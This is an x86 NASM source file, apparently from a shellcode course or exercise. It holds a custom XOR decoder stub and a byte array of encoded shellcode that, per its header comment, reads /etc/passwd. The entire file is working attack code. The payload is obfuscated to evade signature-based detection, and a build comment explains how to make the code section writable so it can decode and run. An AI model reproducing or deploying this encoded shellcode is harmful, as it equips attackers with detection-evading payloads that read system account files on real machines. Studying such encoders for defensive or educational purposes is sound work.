; Filename: custom_decode.nasm
; read /etc/passwd


global _start

section .text
_start:
	jmp _shellcode


_decode_stub:
	pop esi 						; ptr to encoded_shellcode
	xor ecx, ecx			
	mul ecx							; ecx, edx, eax all cleared
	xor ebx, ebx					; ebx cleared

_loop:
	mov dl, byte [esi + ecx]		; mov random byte to dl
	mov bl, byte [esi + ecx + 1]	; mov next instruction to be xor'ed
	
	; exit condition
	cmp bl, 0xff 					; is next byte to xor a 0xff 
	jz _execute
	
	xor bl, dl
	mov byte [esi + eax], bl		; move dl to shellcode
	add ecx, 0x2
	inc eax
	jmp _loop


_execute:
	jmp esi


; section .data						; need .data section to be writable
									; OR, compile with 'ld -N' to make .text section not read-only
_shellcode:
	call _decode_stub
	encoded_shellcode: db 0x1d, 0xa3, 0x50, 0x84, 0x13, 0xb2, 0xc6, 0x83, 0xfc, 0xe2, 0x83, 0x59, 0xda, 0x1b, 0x63, 0xba, 0x6c, 0x18, 0x46, 0x62, 0x2c, 0xd8, 0xab, 0xf6, 0xb7, 0x9e, 0xfb, 0x32, 0x6b, 0xda, 0x2f, 0x3c, 0xa6, 0x97, 0xf8, 0x8d, 0xc6, 0xd5, 0xcc, 0x4f, 0x91, 0x7c, 0x37, 0xcb, 0xe8, 0xeb, 0xf1, 0x84, 0xf6, 0x2d, 0x80, 0xc3, 0xb1, 0x01, 0x04, 0xf1, 0x20, 0xf5, 0xdc, 0xe7, 0xe2, 0xdc, 0x82, 0x88, 0xb7, 0xae, 0xd2, 0xee, 0xe1, 0xfb, 0xbb, 0x80, 0xc8, 0x18, 0x2b, 0xda, 0x41, 0x5d, 0xe1, 0x53, 0xd7, 0xf6, 0x40, 0xf1, 0xc4, 0xda, 0x3c, 0xf9, 0x52, 0xf7, 0x97, 0x55, 0xe7, 0x4e, 0xac, 0x8e, 0x0d, 0x21, 0x2c, 0x17, 0xc5, 0xd6, 0xc9, 0x65, 0x61, 0x5f, 0x83, 0x3f, 0xfa, 0x9e, 0x2e, 0x4e, 0xce, 0x70, 0x84, 0xb1, 0xbc, 0x1a, 0x67, 0xa5, 0x1e, 0xa4, 0x42, 0x07, 0x36, 0x11, 0x35, 0x06, 0x34, 0x4d, 0xe4, 0xa0, 0xed, 0xca, 0x57, 0x64, 0x8b, 0xf6, 0x3b, 0xb1, 0xa1, 0x06, 0xe8, 0x63, 0xb0, 0xcc, 0xcb, 0xdf, 0x50, 0xf8, 0x5e, 0xb5, 0x09, 0xcc, 0xdc, 0xc8, 0x40, 0xe8, 0x35, 0xde, 0x53, 0x6a, 0x64, 0xbc, 0x11, 0x39, 0x15, 0x16, 0xc4, 0x38, 0x01, 0x1c, 0x40, 0x97, 0xe0, 0xcb, 0xdc, 0x0d, 0xe6, 0x62, 0x29, 0x75, 0xca, 0x7d, 0x33, 0x31, 0xaf, 0x98, 0x53, 0xaf, 0x43, 0x07, 0x83, 0xac, 0x4b, 0x8b, 0xe7, 0x7d, 0x37, 0x9d, 0xff, 0xff